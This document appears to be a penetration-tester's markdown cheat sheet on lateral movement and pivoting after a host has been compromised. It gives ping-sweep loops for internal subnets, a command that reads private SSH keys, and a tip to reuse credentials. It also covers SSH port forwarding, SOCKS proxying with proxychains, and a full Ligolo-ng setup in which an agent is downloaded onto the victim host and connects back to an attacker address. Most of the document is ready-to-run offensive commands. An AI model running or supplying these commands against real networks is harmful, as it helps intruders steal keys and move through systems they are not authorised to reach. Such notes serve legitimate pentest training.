
## #LateralMovement & #Pivoting

- Find IPs
	- Linux - `for i in {0..255}; do for j in {1..254}; do (ping -c 1 172.16.$i.$j | grep "bytes from" &) done; done; wait`
		- from ssh / nc shell NOT with proxychains4 as it may not work
		- also enumerate more IPs in subnet with (**change for different subnets!**):
			- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
			- `for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"`
	- Windows  - `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
		- from cmd
- #SSH Keys: `cat ~/.ssh/id_rsa`
- Reuse Credentials: Try credentials across services
- Port Forwarding:
    - `ssh -L 8080:localhost:80 user@<target>`
    - `chisel` for advanced pivoting
- Dynamic SOCKS Proxy: `ssh -D 9050 -N user@<target>`
- #ProxyChains: Modify `/etc/proxychains.conf`
	- `socks4 127.0.0.1 9050`
	- `ssh -i RSA.txt -D 9050 user@10.X.X.X`
	- `proxychains4 <command>`
- #Ligolo-ng: Agent/client setup for tunneling
    - LHOST:
        - `./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601`
        - `sudo sysctl -w net.ipv4.ip_forward=1`
        - `sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`
    - RHOST:
        - Windows:
            - `Invoke-WebRequest -Uri "https://ligolo-agent" -OutFile ligolo-ng_agent.exe`
            - `.\ligolo-ng_agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert`
        - Linux:
            - `wget https://ligolo-agent.tar.gz`
            - `tar -xvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz`
            - `chmod +x ligolo-ng_agent`
            - `./ligolo-ng_agent -connect <ATTACKER_IP>:11601 -ignore-cert`
    - Start Tunnel:
        - `ligolo-ng> session`
        - `ligolo-ng> session <SESSION_ID>`
        - `ligolo-ng> ifconfig`
        - `ligolo-ng> start`
    - Set Up IP Routing:
        - `sudo ip route add <TARGET_NETWORK> dev ligolo`
        - `ip route`
    - Clean Up:
        - `ligolo-ng> stop`
        - `sudo ip route del <TARGET_NETWORK> dev ligolo`